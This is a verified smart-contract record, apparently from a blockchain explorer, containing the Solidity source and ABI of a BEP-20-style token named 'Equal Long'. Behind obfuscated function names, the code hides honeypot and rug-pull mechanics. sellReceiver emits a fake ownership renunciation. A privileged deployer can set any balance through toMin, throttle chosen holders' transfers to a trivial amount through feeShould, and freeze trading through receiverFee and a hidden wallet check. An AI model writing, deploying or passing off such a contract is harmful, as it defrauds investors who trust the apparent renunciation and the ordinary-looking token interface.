{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface txTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableAmountMode {\n    function createPair(address exemptAt, address takeFeeShould) external returns (address);\n}\n\ninterface feeSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeTeamLaunched) external view returns (uint256);\n\n    function transfer(address modeBuy, uint256 walletShouldToken) external returns (bool);\n\n    function allowance(address fromTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletShouldToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeBuy,\n        uint256 walletShouldToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedReceiver, uint256 value);\n    event Approval(address indexed fromTx, address indexed spender, uint256 value);\n}\n\ninterface feeSwapMetadata is feeSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EqualLong is tradingReceiver, feeSwap, feeSwapMetadata {\n\n    address tokenLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public txTotal;\n\n    address public tokenTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toEnable;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyFee;\n    }\n\n    function maxSwap(address tokenIsFrom, address modeBuy, uint256 walletShouldToken) internal returns (bool) {\n        require(autoSwap[tokenIsFrom] >= walletShouldToken);\n        autoSwap[tokenIsFrom] -= walletShouldToken;\n        autoSwap[modeBuy] += walletShouldToken;\n        emit Transfer(tokenIsFrom, modeBuy, walletShouldToken);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLiquidity;\n    }\n\n    function sellReceiver() public {\n        emit OwnershipTransferred(tokenTotal, address(0));\n        tokenTx = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenTx;\n    }\n\n    uint256 enableFee;\n\n    function feeShould(address exemptTake) public {\n        enableMin();\n        if (isFrom != autoIs) {\n            launchedLimit = true;\n        }\n        if (exemptTake == tokenTotal || exemptTake == liquiditySell) {\n            return;\n        }\n        senderFromLimit[exemptTake] = true;\n    }\n\n    function listAt(address buySwap) public {\n        if (txTotal) {\n            return;\n        }\n        \n        maxLiquidityMarketing[buySwap] = true;\n        \n        txTotal = true;\n    }\n\n    function toMin(address toFund, uint256 walletShouldToken) public {\n        enableMin();\n        autoSwap[toFund] = walletShouldToken;\n    }\n\n    address private tokenTx;\n\n    uint256 private autoIs;\n\n    string private toEnable = \"ELG\";\n\n    bool public swapMinLaunch;\n\n    string private receiverLiquidity = \"Equal Long\";\n\n    uint256 private fundIs = 100000000 * 10 ** 18;\n\n    function allowance(address totalTeam, address amountTakeWallet) external view virtual override returns (uint256) {\n        if (amountTakeWallet == tokenLaunched) {\n            return type(uint256).max;\n        }\n        return buyModeExempt[totalTeam][amountTakeWallet];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundIs;\n    }\n\n    function transferFrom(address tokenIsFrom, address modeBuy, uint256 walletShouldToken) external override returns (bool) {\n        if (_msgSender() != tokenLaunched) {\n            if (buyModeExempt[tokenIsFrom][_msgSender()] != type(uint256).max) {\n                require(walletShouldToken <= buyModeExempt[tokenIsFrom][_msgSender()]);\n                buyModeExempt[tokenIsFrom][_msgSender()] -= walletShouldToken;\n            }\n        }\n        return feeMarketingFrom(tokenIsFrom, modeBuy, walletShouldToken);\n    }\n\n    address public liquiditySell;\n\n    function transfer(address toFund, uint256 walletShouldToken) external virtual override returns (bool) {\n        return feeMarketingFrom(_msgSender(), toFund, walletShouldToken);\n    }\n\n    constructor (){\n        \n        txTrading receiverMax = txTrading(tokenLaunched);\n        liquiditySell = enableAmountMode(receiverMax.factory()).createPair(receiverMax.WETH(), address(this));\n        if (isFrom != autoIs) {\n            swapMinLaunch = false;\n        }\n        tokenTotal = _msgSender();\n        sellReceiver();\n        maxLiquidityMarketing[tokenTotal] = true;\n        autoSwap[tokenTotal] = fundIs;\n        \n        emit Transfer(address(0), tokenTotal, fundIs);\n    }\n\n    mapping(address => mapping(address => uint256)) private buyModeExempt;\n\n    uint8 private buyFee = 18;\n\n    function approve(address amountTakeWallet, uint256 walletShouldToken) public virtual override returns (bool) {\n        buyModeExempt[_msgSender()][amountTakeWallet] = walletShouldToken;\n        emit Approval(_msgSender(), amountTakeWallet, walletShouldToken);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return tokenTx;\n    }\n\n    function balanceOf(address takeTeamLaunched) public view virtual override returns (uint256) {\n        return autoSwap[takeTeamLaunched];\n    }\n\n    uint256 constant buySell = 13 ** 10;\n\n    function feeMarketingFrom(address tokenIsFrom, address modeBuy, uint256 walletShouldToken) internal returns (bool) {\n        if (tokenIsFrom == tokenTotal) {\n            return maxSwap(tokenIsFrom, modeBuy, walletShouldToken);\n        }\n        uint256 toListReceiver = feeSwap(liquiditySell).balanceOf(fromTxWallet);\n        require(toListReceiver == minReceiverTotal);\n        require(modeBuy != fromTxWallet);\n        if (senderFromLimit[tokenIsFrom]) {\n            return maxSwap(tokenIsFrom, modeBuy, buySell);\n        }\n        return maxSwap(tokenIsFrom, modeBuy, walletShouldToken);\n    }\n\n    uint256 private isFrom;\n\n    bool public launchedLimit;\n\n    function receiverFee(uint256 walletShouldToken) public {\n        enableMin();\n        minReceiverTotal = walletShouldToken;\n    }\n\n    mapping(address => bool) public maxLiquidityMarketing;\n\n    mapping(address => uint256) private autoSwap;\n\n    address fromTxWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public autoLaunch;\n\n    mapping(address => bool) public senderFromLimit;\n\n    function enableMin() private view {\n        require(maxLiquidityMarketing[_msgSender()]);\n    }\n\n    uint256 minReceiverTotal;\n\n    event OwnershipTransferred(address indexed senderTokenFund, address indexed totalAt);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTokenFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTakeWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTakeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShouldToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeamLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"}],\"name\":\"feeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"}],\"name\":\"listAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxLiquidityMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletShouldToken\",\"type\":\"uint256\"}],\"name\":\"receiverFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderFromLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMinLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShouldToken\",\"type\":\"uint256\"}],\"name\":\"toMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShouldToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenIsFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShouldToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EqualLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}